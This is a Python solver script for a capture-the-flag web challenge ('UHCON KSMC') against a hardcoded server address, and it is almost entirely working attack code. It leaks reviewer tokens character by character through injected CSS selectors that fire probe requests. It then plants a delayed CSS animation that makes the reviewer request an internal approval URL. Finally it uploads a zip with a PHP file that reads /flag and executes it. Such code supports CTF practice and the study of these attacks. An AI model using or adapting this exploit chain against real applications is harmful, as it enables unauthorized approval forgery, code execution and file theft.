#!/usr/bin/env python3
"""End-to-end solver for UHCON KSMC.

Recover the per-template reviewer attributes with a stored-CSS oracle, obtain
an approved package receipt, upload a PHP asset, and read /flag.
"""

from __future__ import annotations

import argparse
import io
import json
from pathlib import Path
import re
import string
import time
import zipfile

import requests
from bs4 import BeautifulSoup


DEFAULT_BASE = "http://43.203.187.25:8080"
ALPHABET = string.ascii_lowercase + string.digits
ACTIVE = {"draft", "pending", "queued", "reviewing"}
FLAG_RE = re.compile(r"(?:FLAG|UHCON|CTF)\{[^}\r\n]+\}", re.I)


def load_account(path: Path, email: str | None, password: str | None) -> tuple[str, str]:
    if email and password:
        return email, password
    account = json.loads(path.read_text(encoding="utf-8"))
    return account["email"], account["password"]


def login(base: str, email: str, password: str) -> requests.Session:
    session = requests.Session()
    page = session.get(base + "/login", timeout=20)
    page.raise_for_status()
    token = BeautifulSoup(page.text, "html.parser").select_one(
        'input[name="_token"]'
    )["value"]
    response = session.post(
        base + "/login",
        data={"_token": token, "email": email, "password": password},
        timeout=20,
    )
    response.raise_for_status()
    if "/login" in response.url:
        raise RuntimeError("login failed")
    return session


def poll_terminal(session: requests.Session, base: str, template_id: str) -> dict:
    url = base + f"/api/v1/print-templates/{template_id}"
    deadline = time.monotonic() + 20
    state: dict = {}
    while time.monotonic() < deadline:
        time.sleep(0.15)
        response = session.get(url, headers={"Accept": "application/json"}, timeout=20)
        response.raise_for_status()
        state = response.json()
        if state.get("state") not in ACTIVE:
            return state
    raise RuntimeError(f"review did not finish: {state}")


def review(
    session: requests.Session,
    base: str,
    template_id: str,
    name: str,
    css: str,
) -> dict:
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    url = base + f"/api/v1/print-templates/{template_id}"
    patched = session.patch(
        url, headers=headers, json={"name": name, "css": css}, timeout=20
    )
    patched.raise_for_status()
    submitted = session.post(url + "/submit", headers=headers, json={}, timeout=20)
    submitted.raise_for_status()
    return poll_terminal(session, base, template_id)


def recover_reviewer_values(
    session: requests.Session, base: str, template_id: str
) -> tuple[str, str, list[dict]]:
    context = "ctx-"
    channel = "chn-"
    history: list[dict] = []
    probe_base = f"/api/v1/print-templates/{template_id}/probes"

    for position in range(16):
        rules: list[str] = []
        context_labels: dict[str, str] = {}
        channel_labels: dict[str, str] = {}
        for index, char in enumerate(ALPHABET):
            rlabel = f"r{position}x{index}"
            clabel = f"c{position}x{index}"
            context_labels[rlabel] = char
            channel_labels[clabel] = char
            rules.append(
                f'#branding-policy[data-review-context^="{context + char}"]'
                f'{{background-image:url("{probe_base}/{rlabel}")!important}}'
            )
            rules.append(
                f'#branding-policy[data-channel^="{channel + char}"]::after'
                f'{{display:block!important;content:url("{probe_base}/{clabel}")!important}}'
            )
        css = "".join(rules)
        if len(css) > 20_000:
            raise RuntimeError(f"CSS limit exceeded at position {position}")
        state = review(
            session, base, template_id, f"KSMC token recovery {position}", css
        )
        probes = state.get("probes", [])
        r_hit = next((label for label in probes if label in context_labels), None)
        c_hit = next((label for label in probes if label in channel_labels), None)
        if not r_hit or not c_hit:
            raise RuntimeError(f"token recovery failed at position {position}: {probes}")
        context += context_labels[r_hit]
        channel += channel_labels[c_hit]
        row = {
            "position": position,
            "review_context": context,
            "channel": channel,
            "probes": probes,
        }
        history.append(row)
        print(json.dumps(row, ensure_ascii=False), flush=True)
    return context, channel, history


def approve(
    session: requests.Session,
    base: str,
    template_id: str,
    context: str,
    channel: str,
) -> dict:
    selector = (
        f'#branding-policy[data-review-context="{context}"]'
        f'[data-channel="{channel}"]'
    )
    probe = f"/api/v1/print-templates/{template_id}/probes"
    state: dict = {}
    for attempt in range(3):
        delay = 1.5 + attempt * 0.75
        decision = (
            f"/internal/template-reviews/{template_id}/decision"
            f"?state=approved&scope=brand-publisher&nonce={time.time_ns()}"
        )
        css = "\n".join(
            [
                f'{selector}::before{{display:block!important;content:url("{probe}/{context}")!important}}',
                f'{selector}::after{{display:block!important;content:url("{probe}/{channel}")!important}}',
                "@keyframes approve-late{0%,70%{background-image:none}"
                f'100%{{background-image:image-set(url("{decision}") 1x)}}}}',
                f"{selector}{{animation:approve-late {delay}s steps(1,end) 1 forwards!important}}",
            ]
        )
        state = review(
            session,
            base,
            template_id,
            f"KSMC exact reviewer handshake {attempt}",
            css,
        )
        if state.get("state") == "approved" and (state.get("capability") or {}).get(
            "receipt"
        ):
            return state
    raise RuntimeError(f"approval failed after retries: {state}")


def php_archive() -> bytes:
    php = """<?php
header('Content-Type: text/plain');
$v = @file_get_contents('/flag');
if ($v !== false) echo $v;
?>
"""
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "manifest.json",
            json.dumps({"name": "KSMC brand assets", "version": "1.0.0"}),
        )
        archive.writestr("flag.php", php)
    return stream.getvalue()


def main() -> None:
    root = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--account", type=Path, default=root / "root_account.json")
    parser.add_argument("--email")
    parser.add_argument("--password")
    parser.add_argument("--result", type=Path, default=root / "solve_result.json")
    args = parser.parse_args()

    email, password = load_account(args.account, args.email, args.password)
    session = login(args.base.rstrip("/"), email, password)
    base = args.base.rstrip("/")
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    created = session.post(
        base + "/api/v1/print-templates",
        headers=headers,
        json={"name": "KSMC end-to-end solver", "css": "x{}"},
        timeout=20,
    )
    created.raise_for_status()
    template_id = created.json()["id"]

    context, channel, recovery = recover_reviewer_values(
        session, base, template_id
    )
    approved = approve(session, base, template_id, context, channel)
    receipt = approved["capability"]["receipt"]
    imported = session.post(
        base + "/api/v1/brand-packages/import",
        data={"template_id": template_id, "review_receipt": receipt},
        files={"archive": ("brand.zip", php_archive(), "application/zip")},
        headers={"Accept": "application/json"},
        timeout=30,
    )
    imported.raise_for_status()
    package = imported.json()
    runtime_url = base + package["asset_base"].rstrip("/") + "/flag.php"
    response = session.get(runtime_url, timeout=20)
    response.raise_for_status()
    match = FLAG_RE.search(response.text)
    if not match:
        raise RuntimeError(f"PHP executed but no flag was returned: {response.text[:1000]}")
    flag = match.group(0)

    result = {
        "template_id": template_id,
        "review_context": context,
        "channel": channel,
        "recovery": recovery,
        "approval": approved,
        "package": package,
        "runtime_url": runtime_url,
        "flag": flag,
    }
    args.result.write_text(
        json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (root / "flag.txt").write_text(flag + "\n", encoding="utf-8")
    print(f"[+] {flag}")


if __name__ == "__main__":
    main()
